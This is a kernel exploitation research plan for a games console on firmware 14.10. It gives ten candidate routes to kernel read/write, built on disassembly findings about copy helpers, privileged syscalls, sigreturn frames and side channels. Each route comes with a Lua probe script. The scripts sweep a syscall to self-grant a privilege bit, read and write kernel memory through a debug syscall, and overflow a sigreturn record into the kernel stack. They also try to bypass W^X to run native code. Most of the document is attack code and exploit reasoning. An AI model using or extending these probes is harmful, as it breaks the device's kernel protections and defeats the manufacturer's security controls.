# CREATIVE_ROUTES_14_10 — ten concrete routes to kernel read/write on FW 14.10

Status: design + offline binary work only. No console was contacted. All 14.10 addresses are
KASLR-relative to the per-boot base recovered by the #PF oracle (docs/ATTACK_SURFACE.md).
All binary claims below are disassembly of the readable 13.60 corpus
(`docs/dumps_13.60/kernel_text.bin`, base 0xffffffff8a9c0000, file offset == RVA) and
`docs/dumps_13.60/sysent_raw.bin`; RVAs are given so the same byte signature can be re-located in
the 14.10 image. Where a shape was confirmed on 14.10, the address is given absolute.

---

## 0. Facts established in this session (new, load-bearing)

### 0.1 The copy helpers reject kernel addresses — and that inverts the usual design rule
`0xffffffff8ac191d0` = copyout(src=kernel, dst=user); `0xffffffff8ac19280` = copyin(user, kernel).
Both do, in this order:

    mov rax, gs:[0x20] ; lea r11,[rip+0x7c] ; mov [rax+0x108], r11   ; install onfault
    test rdx, rdx ; je done
    mov rax, rsi ; add rax, rdx ; jb  -> EFAULT                     ; overflow
    movabs rcx, 0x800000000000 ; cmp rax, rcx ; ja -> EFAULT         ; END address < 2^47
    mov rax, gs:[0] ; mov rax, [rax+8] ; cmp byte [rax+0x591], 0 ; jne -> EFAULT
    movabs rax, 0x7fffffffffff ; and rsi, rax                        ; MASK (no-op for accepted ptrs)
    xchg rdi, rsi ; stac ; rep movsq ; rep movsb ; clac
    fail: clac ; mov rax, 0xe ; ret

Consequences — these are the rules every route below obeys:
1. A kernel-space pointer (>= 0x800000000000) passed as a user buffer is a **clean EFAULT**, never a
   leak. It is also **SMAP-safe**, because kernel pages have U/S=0. Passing a *user* pointer to code
   that dereferences it raw is what panics (measured, docs/HANDLER_SHAPE_HUNT §2). So: to attack a
   raw-deref handler you must pass **kernel** addresses; to attack a copying handler you must pass
   **user** addresses.
2. The `0x7fff…` mask is a no-op for anything that passed the range check, so the range check is the
   whole defence. Any helper variant that lacks it, or checks a different operand, is a bug.
3. There are **fifteen** near-identical variants of this family, not one: the
   `cmp byte [rax+0x591]` gate occurs at `0xffffffff8ac19214, 0x8ac192ea, 0x8ac1939b, 0x8ac1940b,
   0x8ac1948b, 0x8ac194fb, 0x8ac1956b, 0x8ac195db, 0x8ac1965b, 0x8ac196c7, 0x8ac19757, 0x8ac197cb,
   0x8ac1984b, 0x8ac198bb, 0x8ac19966`. docs/COPYOUT_CLASS_CLOSED audited exactly one of them
   (0x8ac191d0) plus 0x8ac19280. **Fourteen helpers are unaudited.** 657 calls the 13th
   (0x8ac19790) with `rdi = [uap+0x10]`.
4. `0x8ac190b0 = memcpy(rdi=dst, rsi=src, rdx=n)` — the body COPYOUT_CLASS said was missing. It has
   **no stac, no 0x800000000000 check, no [proc+0x591] check**, only an overflow test and a
   stack-direction test. It is pure kernel->kernel, so a *kernel* destination handed to it is written
   with no check at all. Confirmed caller in process setup:
   `0xffffffff8b0a4983: mov edx,0x88 ; mov rdi,[[rbx+0xb8]+0x58] ; call 0x8ac190b0`.
5. `proc+0x591` is a real gate byte, set to 1 at `0xffffffff8b3bf748` and to 0 at
   `0xffffffff8b3c011d` (signal-delivery region, adjacent to the 422 installer 0x8b3cac60). While it
   is 1, **every copyin/copyout of that process fails** — a free DoS and a shape oracle.

### 0.2 634/632 do not leak the stack; they leak the *other* frame object
sysent read for all 679 entries: 632 = (narg 1), 633 = (1), 634 = (2), 635 = (2), 636 = (2),
637 = (2), 638 = (4), 639 = (5), 640 = (8); sy_call for 632..640 are nine *distinct* consecutive
pointers, so 632 and 634 are duplicated code, not one merged handler as previously assumed.

634 body: `mov edi,[rsi]` (tid from uap[0]) -> gate `cmp dword [r14+0xe4],0` -> `cmp ecx,3` ->
locks -> `bzero(rbp-0x530, 0x500)` -> `0x8b3cbb60(td, rbp-0x4f0, edx=0)` ->
`copyout(rdi=rbp-0x530, rsi=uap[1], rdx=0x4c0)` -> canary `[rbp-0x30]`.

The filler `0xffffffff8b3cbb60` is the interesting part:

    lea rax,[rdi+0x4e8] ; lea rcx,[rdi+0x460] ; test edx,edx ; cmove rax,rcx
    mov r12,[rax]                                  ; frame pointer selected by edx
    mov rdi,[r12+0x100] ; call 0x8af1d090          ; truncated -> [buf+0x00]
    copy [r12+{0,8,0x18,0x20,0x28,0x38,0x40,0x48,0x50,0x58,0x60,0x68,0x70,0xf8,0x100}]
      ->  [buf+{8,0x10,0x20,0x28,0x30,0x40,0x48,0x50,0x58,0x60,0x68,0x70,0x78,0xb0,0x00}]

The 14.10 trapframe layout (docs/SIGRETURN_FRAME_LAYOUT_14_10.md: rip+0xe8, cs+0xf0, rflags+0xf8,
rsp+0x100, ss+0x108, size 0x110) fits this field list: `[r12+0xf8]` = rflags, `[r12+0x100]` = rsp.
**edx selects between two different frame objects: `[td+0x460]` (edx==0) and `[td+0x4e8]`
(edx!=0).** 634 hardcodes edx=0. 632 is the duplicated body and is the natural home of the edx!=0
path. Whatever object lives at td+0x4e8 is a second saved context per thread; if it is the
kernel-side sigcontext/pcb-style object, the same 0x4c0 copyout returns kernel rip/rsp/segment values
with no bug at all. That is a pure ABI leak, not a handler bug.

### 0.3 601 sets its own privilege bit with no user pointer involved
Dispatcher at RVA `0xca065a` (13.60 full 0xffffffff8b66065a):

    cmp rax,0x27 ; ja 0x8b66221c
    lea rcx,[rip+0xdb0af5]        ; table at full 0x8c411160 (RVA 0x1a51160, outside the text dump)
    mov r15,[rsi+8] ; mov r12,[rsi+0x10] ; mov r8,rdi      ; rsi = uap, rdi = td
    movsxd rdx,[rcx+rax*4] ; add rdx,rcx ; jmp rdx

The block at RVA `0xca12d5` (13.60 full 0xffffffff8b6612d5) does **not** read any user pointer:

    mov r14,[r8+8]                 ; r14 = [td+8] = td_proc  (our OWN proc)
    call 0x8b65afc0                ; check on our own proc
    lea rbx,[r14+0x148] ; call mtx_lock
    mov r13,[r14+0x568]            ; an object hung off our own proc
    or  qword [rax+0x528], 0x100   ; rax = r8 = td  ->  *** sets the trusted bit on CURTHREAD ***
    mov eax,[rax+0x9c] ; mov [r13+0x94],eax    ; td_tid into that object
    mov dword [r13+0x34],2 ; call 0x8b0fef00 ; call 0x8b0fe780(r13,r13+0x10,0)
    mov dword [r13+0x34],1 ; return 0 / 4 / 0x16

and a sibling block at RVA `0xca13da` does `or byte ptr [r12+0x529], 8` (also on td).

`*(u64*)(td+0x528) & 0x100` is exactly the gate HANDLER_SHAPE_HUNT §3 found on 601's type
dispatcher ("bit set => types 1,2,6,100 reachable; else type must be 0xb8"). So the previous
conclusion — "attach is post-leak only" — is wrong in the useful direction: **some command in
0x00..0x27 sets the bit on our own thread as a self-service.** The table at 0x1a51160 is not in the
text dump, so the command number must be recovered by *behaviour* (route 1).

### 0.4 Other numbers reused below
* 638/639 TZ table 0xffffffff8e2d5920, count at +0x2000 = 0xffffffff8e2d7920 (reads 260), lock
  0xffffffff8e2d5900. ABI `{int64 input; int32 policy; pad; uintptr value_out; uintptr record_out(16);
  int32 correction_out}`.
* 636 = same table, 8 KB copyin, gate `sub_ffffffff8afc8f90([td+0x140])` = bit 62 of `cred+0x60`,
  checked **before** the count. Bit-62 tests appear at process setup in 13.60
  (`0xffffffff8b0a49ab: test qword [rbx+0xd0], 0x4000000000000000`;
  `0xffffffff8b0a50b9: test rcx, r8` with `rcx=[rdi+0x140]->+0x60`); no *setter* was found in text.
* PMC 625/626: 8 live 32-bit counters, +0x1D9E3 per call (docs/MICROARCH_FEASIBILITY_14_10.md).
* clock_gettime(232) floor 92-95 us => wall-clock cache work is dead; PMC work is not.
* 620 free_stack MODE 5: `(saved_rip-0x80) & ~0x3fff` — possible W^X bypass, probes 99a B/C written
  and never run (docs/TODO.md:104-110).
* Kernel AVX function 0xffffffff8a876870, 53 call sites in RVA 0x876000-0x87a000, **0 vzeroupper in
  15.1 MB**; eboot gadgets +0xDB597 (load ymm0) and +0xF7CB7 (store ymm0).

---

## Route 1 — 601 self-grant sweep, then the gated type table (kernel read AND write)
**EV: highest. Probability of a kernel read: high (the gate is nearly free). Kill risk: per-command, medium.**

(a) Mechanism. The type dispatcher in 601 refuses every useful type unless bit 0x100 of
`*(u64*)(td+0x528)` is set; docs measured that with the bit set, types 1,2,6,100 become reachable,
type 1 is clamped to 0x80000, type 7 to 0x100/0xf, types 3/4 copy 8 bytes out of a stack local, type
100 does `copyin(min(len,0x1000))` then calls a kernel function on the buffer with the return
discarded. At least one command in 0x00..0x27 sets that bit on curthread with no credential and no
pointer argument (§0.3). Therefore: walk the command space one command per probe run (skipping the
five known-lethal values), and after each command re-issue a *gated* type and compare the error code.
A change from EPERM to anything else proves the bit is set. The same bit gates the log drain
("mdbglog", 0x1000/0x100, log_printf, uiomove), so success also opens Route 8.

(b) Shape. `native.fcall_with_rax(SC, N(601), N(cmd), N(0), N(0), N(0), N(0), N(0))`, then
`native.fcall_with_rax(SC, N(601), N(2), N(0), N(0), N(0), N(0), N(0))`. td+0x528 is not readable
yet, so the observable is the second call's return value and, for type 3/4, an 8-byte buffer. Sweep
cmd in {0x00,0x01,0x02,0x05,0x06,0x07,0x09,0x0A,0x0B,0x0D..0x1F,0x20..0x26}; exclude 0x03,0x04
(measured panic), 0x08,0x0C (loader park), 0x27 (loader dead).

(c) Not covered because every earlier 601 probe either swept *types* with the gate closed (1179a) or
swept *commands* while looking for ASCII output, not for a change of privilege state. The
`or [td+0x528],0x100` write was recorded as "post-leak only" and never re-examined as a grant.

(d) Probe sketch (probes/phase17_new_vectors/1201a_selfgrant_sweep.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local OUT = memory.alloc(0x100)
local function c601(a,b,c) return native.fcall_with_rax(SC,N(601),N(a),N(b),N(c),N(0),N(0),N(0)) end
local CMDS = {0x00,0x01,0x02,0x05,0x06,0x07,0x09,0x0A,0x0B,0x0D,0x1F,0x20,0x26}
for _,cmd in ipairs(CMDS) do
  local r0 = c601(cmd,0,0)
  local r1 = c601(0x02,0,OUT)          -- gated type 2
  local r3 = c601(0x03,0,OUT)          -- gated copyout of local_40 (8 bytes)
  print(string.format("[P] cmd=%02x r0=%d type2=%d type3=%d out=%s",
        cmd, r0, r1, r3, memory.hex_dump(OUT, 8)))
  if r1 ~= -1 or r3 ~= -1 then
    print("[!!] GATE OPEN at cmd "..string.format("%02x",cmd)) break
  end
end
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. One syscall per sacrificial child thread, buffers on the main thread
(docs/SACRIFICIAL_THREAD_14_10.md). 0x03/0x04 already panic, 0x08/0x0C wedge the loader, 0x27 kills it;
the remaining commands are untested, but the block in §0.3 shows only self-referential work (own
proc, own thread, own object), so the expected failure is EINVAL, not a panic. One command per probe
file, so a panic costs one reboot and one data point.

---

## Route 2 — 634/632 with the td+0x4e8 frame selector (kernel saved context, pure ABI)
**EV: high for a kernel address read. Kill risk: low on self, medium otherwise.**

(a) Mechanism. The 0x4c0-byte copyout of 634 is not a stack leak: the source is a 0x500-byte zeroed
frame whose middle is filled by `0x8b3cbb60(td, buf, edx)` from the thread's own saved context. That
filler reads a frame pointer selected by edx: [td+0x460] when edx==0 and [td+0x4e8] when edx!=0, then
copies 15 qwords plus rflags/rsp out of it. 634 hardcodes edx=0. If any reachable path (632's
duplicated body, or a 634 uap value feeding the `cmp ecx,3` branch) passes edx!=0, the same syscall
returns a *different* context object — plausibly the kernel-side save area — and the copy is legal by
construction: no pointer argument, no length argument, no attacker dereference.

(b) Shape. `native.fcall_with_rax(SC, N(634), N(tid), N(out), 0,0,0,0)` with tid = our own (start
with the pid from syscall 20, then tid = 0 and -1), out = memory.alloc(0x4c0). Hexdump out+0x00
(rsp, truncated), out+0xb0 (rflags) and all 15 GPR slots; any value matching 0xffffffff8… or 0xffff8…
is a kernel pointer. Repeat for 632 (same shape, narg=1, so try both (tid, out) and (out) orderings).

(c) Not covered because COPYOUT_CLASS_CLOSED §3 closed 634 on the grounds that the stack local is
bzeroed (true) and therefore the copy cannot leak (false — the filler writes attacker-relevant data
into it). Nothing examined 0x8b3cbb60 itself or the two frame pointers.

(d) Probe sketch (1202a_ucontext_frame_selector.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local OUT = memory.alloc(0x4c0)
local function hex(a,n) return (memory.read_buffer(a,n):gsub(".",function(c)
  return string.format("%02x",string.byte(c)) end)) end
local function call(num,a,b) return native.fcall_with_rax(SC,N(num),N(a),N(b),N(0),N(0),N(0),N(0)) end
local pid = native.fcall(syscall.getpid)
for _,tid in ipairs({pid, 0, -1}) do
  for _,num in ipairs({634, 632, 635}) do
    local r = call(num, tid, OUT)
    print(string.format("[P] sys=%d tid=%d ret=%d head=%s", num, tid, r, hex(OUT,0x40)))
    print(string.format("[P]   rsp=%s rflags=%s", hex(OUT,8), hex(OUT+0xb0,8)))
  end
end
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. If [td+0x460] is NULL for the chosen thread the filler dereferences NULL in kernel mode
and the console panics. Our own running thread cannot be NULL there; a parked child (601 cmd 0x0C,
measured to park only the child in 1175a) also has a frame. Avoid arbitrary pids: another process's
thread is fine, an exited thread leaves a stale pointer. Do not combine with 632's edx!=0 path until
the ordering is known.

---

## Route 3 — audit the fourteen unaudited copy helpers for a uap-derived source

> **CLOSED, 2026-11-04.** All 17 entries of the family are now classified; 15 of 15
> user-accessing entries validate the exact register they dereference, and no handler-reachable call site
> passes a kernel address to a read variant. See `docs/USER_ACCESS_FAMILY_AUDIT.md`.

**EV: medium-high, the only shape that yields arbitrary kernel read. Kill risk: none offline / low on target.**

(a) Mechanism. 638 gives 16 bytes because its copyout source is a *global table* indexed by a
caller-supplied integer. The generalisation is a copyout whose *source pointer* comes from uap. The
docs proved that for one helper (0x8ac191d0: 15 sites, all stack locals, no partial init, no caller
lengths). The same family has fifteen bodies (§0.1.3), and 657 already calls the 13th (0x8ac19790)
with `rdi = [uap+0x10]` — a caller-supplied *value* in the source register. If any variant moves the
source from a uap slot instead of a local, or checks the destination range instead of the source (a
copyout signature swap), arbitrary kernel read follows with a single syscall.

(b) Shape. Offline: disassemble 0x8ac191d0..0x8ac19a00 and classify each variant by (arg order of the
`xchg`, presence of `cmp rax,0x800000000000`, presence of the [proc+0x591] gate, rep movsq vs
movsq), then for each of the 15 addresses grep the text dump for `call <addr>` and walk backwards to
see whether the source register was loaded from [rsi+…]/[rbx+…] where that register is the uap. On
target: for each candidate helper call its syscall with the source slot = 0xffffffff8e2d5920 - delta
(a known mapped .data address) and see whether the returned bytes change with the address. A read of
.data is harmless; only an unmapped source can panic, and the TZ table is always mapped.

(c) Not covered because COPYOUT_CLASS_CLOSED audited one body and inferred the rest from call sites; it
never enumerated the family, and 657's call with a uap-derived rdi was never followed.

(d) Probe sketch (1203a_helper_family_probe.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local TZ = 0xffffffff8e2d5920
local OUT = memory.alloc(0x40)
local function hex(a,n) return (memory.read_buffer(a,n):gsub(".",function(c)
  return string.format("%02x",string.byte(c)) end)) end
local function call657(src,dst,n) return native.fcall_with_rax(SC,N(657),N(0),N(src),N(dst),N(n),N(0),N(0)) end
for _,src in ipairs({TZ, TZ+0x10, TZ+0x20}) do
  local r = call657(src, OUT, 0x20)
  print(string.format("[P] 657 src=%x ret=%d out=%s", src, r, hex(OUT,0x20)))
end
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. EFAULT if the helper rejects kernel addresses (expected, same check family); panic only
if the helper dereferences the source raw *and* the address is unmapped — so pass only addresses known
to be mapped (TZ table, its lock, its count). Never pass 0x0 to a raw-deref site.

---

## Route 4 — PMC counters as the missing high-resolution timer, then Prime+Probe on 638
**EV: medium-high for arbitrary kernel bytes (statistical). Kill risk: none.**

(a) Mechanism. Three measurements say the platform has no usable cycle clock (clock_gettime floor
92-95 us, 232's cache path dead, 624 has 0 jitter but counts VM ops only), which killed earlier cache
work. 625/626 are different: they program and read eight *live hardware counters* (+0x1D9E3 per call,
so they are counting something real). If any of the eight events is cycles or L2 accesses, a
Prime+Probe channel exists that never enters the kernel for a timestamp. The timezone table (known
address, known size, caller-controlled index) is a known-signal training ground, and the target is
anything a handler touches with a secret-dependent address: cred loads, the 601 log buffer, sysent
dispatch.

(b) Shape. `native.fcall_with_rax(SC, N(626), N(i), N(0), N(0), N(p4), N(p5), N(0))` for i in 0..7,
read before and after (i) a register-only loop and (ii) a multi-megabyte stride-64 load loop; a counter
that scales with (ii) is cycle- or L2-miss-like. Then 638 with input chosen so table[index] is the
probed line, value_out = a user page; Prime+Probe a *user* page first to calibrate the amplifier, then
a kernel line via 638's access.

(c) Not covered because the earlier conclusion ("wall-clock cache work dead") was generalised to side
channels, and MICROARCH recorded 626's counters as "8 live counters" without ever classifying events.

(d) Probe sketch (1204a_pmc_event_class.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local function pmc(i) return native.fcall_with_rax(SC,N(626),N(i),N(0),N(0),N(0),N(0),N(0)) end
local BUF = memory.alloc(0x400000)
for i=0,7 do
  local a = pmc(i)
  local s = 0
  for k=0,0x3ff do s = s + memory.read_qword(BUF + k*0x1000) end
  local b = pmc(i)
  print(string.format("[P] counter %d: before=%s after=%s", i, a, b))
end
for i=0,7 do print(string.format("[P] idle %d = %s", i, pmc(i))) end
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. None beyond a normal process kill: no kernel pointer is dereferenced and the counters
are already exposed to unprivileged code (measured).

---

## Route 5 — YMM cross-privilege residue with a valid positive control
**EV: medium for kernel data, low for addresses. Kill risk: none.**

(a) Mechanism. The kernel contains a real AVX function (0xffffffff8a876870, 0x760 frame,
vbroadcastss/vcmpss, 15 loads, 44 stores) with 53 call sites and 0 vzeroupper in 15.1 MB. On syscall
return the kernel does not scrub ymm0-15. If our thread poisons a YMM register, calls a syscall that
reaches the AVX function, and spills the register afterwards, the spilled value is the kernel's last
fp/vector constant — a data read of kernel .rodata, including addresses if a vector holds a pointer.
1187a/1188a never established that the store gadget even executed (the destination stayed at its 0xC0
fill); the likely cause is that rsi is clobbered by `push_set_r9_wo_call` (documented as clobbering
rax, rsi, r8) or that the chain never reached the store.

(b) Shape. LOAD = eboot+0xDB597 = `vmovups ymm0,[rdi+0x28]; vmovups [rsi+0xc8],ymm0; mov [rsi+0xe8],al;
xor eax,eax; ret`; STORE = eboot+0xF7CB7 = `vmovups [rsi],ymm0; ret`. Positive control (must pass
before any syscall): load ymm0 from a user buffer holding 32 known bytes, store to a second user
buffer, compare — a 32-byte memcpy through ymm. Only then insert the syscall between load and store.

(c) Not covered because 1187a's negative result was never validated with a memcpy control, so the
route is unmeasured rather than closed.

(d) Probe sketch (1205a_ymm_memcpy_control.lua):
```lua
local function N(v) return uint64.new(v) end
local LOAD  = N(eboot_base + 0xDB597)
local STORE = N(eboot_base + 0xF7CB7)
local SRC = memory.alloc(0x100) ; local DST = memory.alloc(0x100)
for i=0,31 do memory.write_byte(SRC+0x28+i, 0x41+i) end
local function spill()
  native.fcall(LOAD,  SRC, DST)     -- ymm0 <- [SRC+0x28]; also writes DST+0xc8
  native.fcall(STORE, 0,  DST)      -- [DST] <- ymm0  (set rsi last)
end
spill()
print("[P] dst = " .. memory.hex_dump(DST, 0x20))
print("[P] ctl = " .. memory.hex_dump(SRC+0x28, 0x20))
native.fcall_with_rax(N(syscall.syscall_address), N(638), N(0), N(0), N(0), N(0), N(0), N(0))
spill()
print("[P] after 638 = " .. memory.hex_dump(DST, 0x20))
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. None: gadgets are in readable eboot, the syscall is 638, no kernel pointer. If the
control still fails, the failing half identifies whether rsi or ymm is the problem.

---

## Route 6 — re-test 619 test_debug_rwmem after Route 1 sets td+0x528 & 0x100
**EV: high if the gate is that bit, else zero. Kill risk: low.**

(a) Mechanism. 179a tried 15 argument layouts of 619 and got -1 for all, concluding there is a
privilege or process-flag gate. The only privilege bit a *user-reachable* handler is now known to set
is td+0x528 & 0x100 (Route 1), and 619's name (test debug read/write memory) is exactly the capability
a "debug attached" bit should unlock. In the PS4 lineage the debug rwmem call takes (pid, src, dst,
len, write) and pid = -1 means kernel. If 619 is gated on that bit, Route 1 + Route 6 is arbitrary
kernel read/write in two syscalls.

(b) Shape. After the Route 1 sweep: `native.fcall_with_rax(SC, N(619), N(-1), N(kernel_addr),
N(user_buf), N(8), N(0), N(0))` and the mirror with N(1) in the write slot. Re-run all 15 layouts from
179a with the bit set.

(c) Not covered because 179a ran before the grant path was known, and no later probe retried 619 after
any 601 command.

(d) Probe sketch (1206a_619_after_grant.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local OUT = memory.alloc(0x40)
local function call(n,a,b,c,d) return native.fcall_with_rax(SC,N(n),N(a),N(b),N(c),N(d),N(0),N(0)) end
call(601, 0x00, 0, 0, 0)                 -- cmd from Route 1's winner
local TZ = 0xffffffff8e2d5920
local r1 = call(619, -1, TZ, OUT, 8)     -- (pid, src, dst, len)
local r2 = call(619, 0,  TZ, OUT, 8)
print(string.format("[P] 619(-1)=%d 619(0)=%d out=%s", r1, r2, memory.hex_dump(OUT,0x20)))
call(601, 0x02, 0, OUT, 0)
print("[P] type2 = " .. memory.hex_dump(OUT, 0x10))
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. If 619 really writes to the address it is given, a wrong layout could write 8 bytes into
the TZ table (harmless: 638 shows a changed record) rather than panic. Arm the write half only after
the read half returns sensible data.

---

## Route 7 — 417 sigreturn's 0x500-byte user record against a 0x110-byte kernel frame
**EV: medium for a controlled kernel write; high panic risk. Read value only via Route 2.**

(a) Mechanism. docs measured that 417 copies 0x500 bytes from a user record and validates RFLAGS
against a mask, and that the installed trapframe is 0x110 bytes at td+0x460. 0x500 > 0x110: if the copy
target is the frame object itself (rather than a stack temporary applied field by field), the tail of
our record spills past the frame into the thread's kernel stack — a user-controlled kernel-stack write
with a known destination, guarded only by the rflags mask and the cs/ss checks. The read side is Route
2: 634 returns exactly that object, so a round trip (write a marker through 417, read it back through
634) proves the aliasing without guessing.

(b) Shape. Build a 0x500-byte record, all GPRs = marker, rip = a mapped user address, cs = 0x43,
rflags = 0x202 (passes the -0x254dd6 mask), rsp = a valid user stack, ss = 0x3b; put a unique 8-byte
pattern at record offsets 0x110..0x1ff. Call 417 with a pointer to it from a sacrificial thread whose
only job is that call, then 634 on the same thread and compare.

(c) Not covered because SIGRETURN_FRAME_LAYOUT_14_10 concluded "417 owns no frame writes" from the
absence of inline frame stores, without checking whether the 0x500 copyin destination is the frame or
a temporary.

(d) Probe sketch (1207a_417_634_roundtrip.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local REC = memory.alloc(0x500) ; local OUT = memory.alloc(0x4c0)
for i=0,0x4f do memory.write_qword(REC + i*8, 0x1111000000000000 + i) end
memory.write_qword(REC + 0xe8, 0x00401000)
memory.write_qword(REC + 0xf0, 0x43)
memory.write_qword(REC + 0xf8, 0x202)
memory.write_qword(REC + 0x100, user_stack)
memory.write_qword(REC + 0x108, 0x3b)
local function call(n,a,b) return native.fcall_with_rax(SC,N(n),N(a),N(b),N(0),N(0),N(0),N(0)) end
print("[P] 417 ret = " .. call(417, REC, 0))
print(string.format("[P] 634 ret=%d frame=%s", call(634, pid, OUT), memory.hex_dump(OUT,0x40)))
print("[P] record echo at 0x110 = " .. memory.hex_dump(OUT+0x110, 0x10))
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. High: a bad tf_ss panics (measured), and any spill past the frame corrupts the kernel
stack, so the first run must keep record offsets > 0x110 equal to the *expected* content rather than
markers. Run it last; expect a console reboot.

---

## Route 8 — the 601 log drain as a kernel-pointer printer (payload of Route 1)
**EV: high if Route 1 lands, low standalone. Kill risk: loader park possible (601 0x08/0x0C class).**

(a) Mechanism. The drain path inside 601 creates "mdbglog" (0x1000 buffer, 0x100 entries), memcpys via
0x8ac190b0 and uiomove 0x782520 to the caller, and its entry formats include
`0x12c9cb5 "mDBG: Kernel Build ID = %lx"`. Every entry produced by *other* kernel code is a format
string expanded with kernel values; kernel code that logs a pointer (a proc, a thread, a vm_map, a
lock) gives us a KASLR-defeating address for free. Nothing here is a bug: it is a diagnostic channel
locked behind the type gate Route 1 opens. Once open, drain repeatedly while triggering VM, signal and
fault activity to enrich the log.

(b) Shape. `native.fcall_with_rax(SC, N(601), N(cmd_drain), N(user_buf), N(len), 0,0,0)` with a
0x1000 user buffer, repeated; scan the bytes for ffffffff8, ffff8, 7fff patterns. The uiomove path uses
the copy-out family, so the destination must be a *user* address (kernel dst => EFAULT, §0.1).

(c) Not covered because `grep -r mDBG results/` is empty: the drain was never reachable while
probing, so its content has never been observed.

(d) Probe sketch (1208a_mdbg_drain.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local BUF = memory.alloc(0x1000)
local function call(n,a,b,c) return native.fcall_with_rax(SC,N(n),N(a),N(b),N(c),N(0),N(0),N(0)) end
for tries=1,8 do
  local r = call(601, DRAIN_CMD, BUF, 0x1000)
  print(string.format("[P] drain %d ret=%d first=%s", tries, r, memory.hex_dump(BUF,0x40)))
  local s = memory.read_buffer(BUF, 0x1000)
  for line in s:gmatch("[^%z]+") do
    if line:find("ffff") then print("[LEAK] " .. line) end
  end
end
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. The drain is 601, so the known wedge set applies to the command space; once the drain
command is known it is a read-only path and the damage is at most a stuck loader (relaunch, console
fine).

---

## Route 9 — 640 set_uevt: narg=8 on a 6-register ABI (stale kernel stack in uap[6], uap[7])
**EV: low-medium, but the only route where a handler reads kernel stack as an argument. Kill risk: low.**

(a) Mechanism. sysent[640] declares narg = 8 (sysent_raw.bin). amd64 passes syscall arguments in six
registers only, so the dispatcher's args[6]/args[7] slots can never be filled from user mode: whatever
the handler reads there is stale *kernel* stack (the previous syscall's locals at that frame offset).
640 is the only entry with narg > 6 in all 679 entries. If the body reads slot 6 or 7 and uses it as a
pointer or a length, that is an argument we can only influence indirectly — but "indirectly" is
powerful here: it is a kernel-stack info flow. The 13.60 corpus window for 640 shows no [rsi+0x30] /
[rsi+0x38] read, which is itself the discriminating result to obtain for the 14.10 image.

(b) Shape. Offline: disassemble the 640 body from its sysent sy_call and record every uap access
offset; anything >= 0x30 is a stale slot. On target: call 640 with a valid 6-argument uevt, then
immediately call it again after a *different* preceding syscall and see whether behaviour changes in a
way that correlates with the previous syscall's arguments.

(c) Not covered because narg was never compared against the 6-register limit; previous 640 work went
into the rep movsq index arithmetic.

(d) Probe sketch (1209a_640_arg_overread.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local EV = memory.alloc(0x200)
for i=0,0x3f do memory.write_qword(EV+i*8, 0) end
local function c640(a,b,c,d,e,f) return native.fcall_with_rax(SC,N(640),a,b,c,d,e,f) end
print("[P] plain = " .. c640(N(EV),N(0),N(0),N(0),N(0),N(0)))
native.fcall_with_rax(SC, N(638), N(0), N(0), N(0), N(0), N(0), N(0))
print("[P] groomed = " .. c640(N(EV),N(0),N(0),N(0),N(0),N(0)))
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. Low: 640 with a zeroed uevt is a rejected no-op in prior probes; the risk is only if the
stale slot is used as a pointer, in which case the failure is a panic.

---

## Route 10 — 620 free_stack MODE 5 as a W^X bypass, to get native code and a real rdtsc
**EV: low for kernel R/W directly, high as an enabler. Kill risk: process-only.**

(a) Mechanism. Every user mapping is NX (mmap strips X; mprotect always fails), so all timing and cache
work must go through syscalls. 620's MODE 5 on `(saved_rip - 0x80) & ~0x3fff` was flagged as a
possible W^X bypass and probes 99a B/C were written but never run. Native user code buys rdtsc (no
92 us floor), clflush and exact register control without the ROP scheduler — what Route 4 needs if the
PMC counters turn out not to be cycle-like. It does not by itself give kernel R/W; it removes the
excuse for not having a timer.

(b) Shape. Follow probes 99a B/C: mmap a page, write code, call 620 with the documented mode/limit
pair, then branch to it and immediately rdtsc into a shared buffer. Success = the code runs; the rdtsc
value is the proof (non-zero and monotonic across calls).

(c) Not covered because 99a B/C were written and never executed; RWX_ORACLE_14_10 only tested
mmap/mprotect, not 620.

(d) Probe sketch (1210a_620_mode5_exec.lua):
```lua
local function N(v) return uint64.new(v) end
local SC = N(syscall.syscall_address)
local CODE = memory.alloc(0x1000)
memory.write_buffer(CODE, "\72\137\23\49\192\195")   -- mov [rdi],rdx ; xor eax,eax ; ret
local OUT = memory.alloc(0x40)
print("[P] 620 mode5 ret = " .. native.fcall_with_rax(SC,N(620),N(5),N(CODE),N(0x1000),N(0),N(0),N(0)))
local ok, err = pcall(function() return native.fcall(CODE, OUT, 0, 0x12345678) end)
print(string.format("[P] call ok=%s err=%s out=%s", ok, tostring(err), memory.hex_dump(OUT,8)))
print("[Z] alive") print("=== DONE ===")
```

(e) Kill risk. Process-only: an NX fault kills the loader thread at worst (SIGSEGV is signed in), and
620's documented failure mode is a wrong return, not a panic.

---

## Ranking summary

| # | Route | kernel read probability | writability | panic risk |
|---|-------|-------------------------|-------------|------------|
| 1 | 601 self-grant sweep | high (state change nearly free) | enables types 1/2/6/100 | per-command, medium |
| 2 | 634/632 frame selector | medium-high (ABI, no bug) | no | low on self, medium on others |
| 3 | 14 unaudited copy helpers | medium (only arbitrary-read shape) | mirror shape exists | none offline |
| 6 | 619 after grant | high if gate = bit 0x100 | high (rwmem) | low |
| 8 | mdbg drain | high if Route 1 lands | no | loader park |
| 4 | PMC -> Prime+Probe | medium (arbitrary bytes, statistical) | no | none |
| 5 | YMM residue | low (data, not addresses) | no | none |
| 7 | 417 0x500 vs 0x110 frame | medium (via 634) | high (kernel stack) | high |
| 9 | 640 narg=8 | low | low | low |
